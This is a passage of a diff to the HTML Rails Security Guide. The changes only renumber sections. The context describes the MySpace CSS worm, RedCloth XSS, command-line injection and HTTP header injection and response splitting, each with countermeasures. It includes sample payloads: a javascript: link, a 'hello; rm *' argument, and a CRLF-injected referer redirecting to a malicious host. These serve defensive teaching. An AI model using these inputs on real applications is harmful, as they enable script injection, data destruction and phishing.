 <div class="paragraph"><p>MySpace blocks many tags, however it allows CSS. So the worm&#8217;s author put JavaScript into CSS like this:</p></div>
@@ -1012,9 +1016,9 @@ s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))</tt
 <div class="paragraph"><p>Another problem for the worm&#8217;s author were CSRF security tokens. Without them he couldn&#8217;t send a friend request over POST. He got around it by sending a GET to the page right before adding a the user and parsing the result for the CSRF token.</p></div>
 <div class="paragraph"><p>In the end, he got a 4 KB worm, which he injected into his profile page.</p></div>
 <div class="paragraph"><p>The <a href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).</p></div>
-<h4 id="_countermeasures_4">8.4.1. Countermeasures</h4>
+<h4 id="_countermeasures">7.4.1. Countermeasures</h4>
 <div class="paragraph"><p>This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. <span style="background-color: #fffcdb;">If you want to allow custom colours or images, you can allow the user to choose them and build the CSS in the web application</span>. Use Rails' <tt>sanitize()</tt> method as a model for a whitelist CSS filter, if you really need one.</p></div>
-<h3 id="_textile_injection">8.5. Textile Injection</h3>
+<h3 id="_textile_injection">7.5. Textile Injection</h3>
 <div class="paragraph"><p>-- <em>If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. <a href="http://whytheluckystiff.net/ruby/redcloth/">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to XSS.</em></p></div>
 <div class="literalblock">
 <div class="content">
@@ -1037,15 +1041,15 @@ s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))</tt
 <pre><tt>&gt;&gt; RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
 =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"</tt></pre>
 </div></div>
-<h4 id="_countermeasures_5">8.5.1. Countermeasures</h4>
+<h4 id="_countermeasures_2">7.5.1. Countermeasures</h4>
 <div class="paragraph"><p>It is recommended to <span style="background-color: #fffcdb;">use RedCloth in combination with a whitelist input filter</span>, as described in the countermeasures against XSS.</p></div>
-<h3 id="_ajax_injection">8.6. Ajax Injection</h3>
+<h3 id="_ajax_injection">7.6. Ajax Injection</h3>
 <div class="paragraph"><p>-- <em>The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn&#8217;t render a view.</em></p></div>
 <div class="paragraph"><p>If you use the <a href="http://dev.rubyonrails.org/browser/plugins/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <span style="background-color: #fffcdb;">you have to escape the return value in the action</span>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</p></div>
-<h3 id="_rjs_injection">8.7. RJS Injection</h3>
+<h3 id="_rjs_injection">7.7. RJS Injection</h3>
 <div class="paragraph"><p>-- <em>Don&#8217;t forget to escape in JavaScript (RJS) templates, too.</em></p></div>
 <div class="paragraph"><p>The RJS API generates blocks of JavaScript code based on Ruby code, thus allowing you to manipulate a view or parts of a view from the server side. <span style="background-color: #fffcdb;">If you allow user input in RJS templates, do escape it using escape_javascript() within JavaScript functions, and in HTML parts using h()</span>. Otherwise an attacker could execute arbitrary JavaScript.</p></div>
-<h3 id="_command_line_injection">8.8. Command Line Injection</h3>
+<h3 id="_command_line_injection">7.8. Command Line Injection</h3>
 <div class="paragraph"><p>-- <em>Use user-supplied command line parameters with caution.</em></p></div>
 <div class="paragraph"><p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).</p></div>
 <div class="paragraph"><p>A countermeasure is to <span style="background-color: #fffcdb;">use the <tt>system(command, parameters)</tt> method which passes command line parameters safely</span>.</p></div>
@@ -1054,7 +1058,7 @@ s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))</tt
 <pre><tt>system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files</tt></pre>
 </div></div>
-<h3 id="_header_injection">8.9. Header Injection</h3>
+<h3 id="_header_injection">7.9. Header Injection</h3>
 <div class="paragraph"><p>-- <em>HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting.</em></p></div>
 <div class="paragraph"><p>HTTP request headers have a Referer, User-Agent (client software) and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. <span style="background-color: #fffcdb;">Remember to escape these header fields, too.</span> For example when you display the user agent in an administration area.</p></div>
 <div class="paragraph"><p>Besides that, it is <span style="background-color: #fffcdb;">important to know what you are doing when building response headers partly based on user input.</span> For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:</p></div>
@@ -1081,7 +1085,7 @@ http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aL
 Location: http://www.malicious.tld</tt></pre>
 </div></div>
 <div class="paragraph"><p>So <span style="background-color: #fffcdb;">attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</span> And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. <span style="background-color: #fffcdb;">Rails 2.1.2 escapes these characters for the Location field in the redirect_to method. Make sure you do it yourself when you build other header fields with user input.</span></p></div>
-<h4 id="_response_splitting">8.9.1. Response Splitting</h4>
+<h4 id="_response_splitting">7.9.1. Response Splitting</h4>
 <div class="paragraph"><p>If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:</p></div>
 <div class="literalblock">
 <div class="content">
@@ -1102,7 +1106,7 @@ Content-Type: text/html</tt></pre>
 </div></div>
 <div class="paragraph"><p>Under certain circumstances this would present the malicious HTML to the victim. However, this seems to work with Keep-Alive connections, only (and many browsers are using one-time connections). But you can&#8217;t rely on this. <span style="background-color: #fffcdb;">In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</span></p></div>
 </div>
-<h2 id="_additional_resources">9. Additional resources</h2>
+<h2 id="_additional_resources">8. Additional resources</h2>
 <div class="sectionbody">
 <div class="paragraph"><p>The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:</p></div>
 <div class="ulist"><ul>
@@ -1133,7 +1137,7 @@ Another <a href="http://www.0x000000.com/">good security blog</a> with some Chea
 </li>
 </ul></div>
 </div>
-<h2 id="_changelog">10. Changelog</h2>
+<h2 id="_changelog">9. Changelog</h2>
 <div class="sectionbody">
 <div class="paragraph"><p><a href="http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7">Lighthouse ticket</a></p></div>
 <div class="ulist"><ul>
